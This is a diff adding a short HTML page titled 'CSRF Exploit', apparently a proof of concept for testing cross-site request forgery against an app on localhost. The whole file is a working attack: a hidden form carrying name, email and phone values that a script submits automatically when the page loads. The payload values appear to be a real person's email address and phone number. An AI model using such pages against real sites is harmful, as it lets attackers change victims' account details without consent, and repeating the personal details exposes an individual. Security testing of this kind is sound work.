@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Exploit</h1>
+    <form id="csrfForm" method="PUT" action="http://localhost:3000/me/update">
+        <!-- Replace the values with your desired payload -->
+        <input type="hidden" name="name" value="Karthik">
+        <input type="hidden" name="email" value="karthikeya9985@gmail.com">
+        <input type="hidden" name="phone" value="9177000719">
+    </form>
+    <script>
+        // Automatically submit the form upon loading the page
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
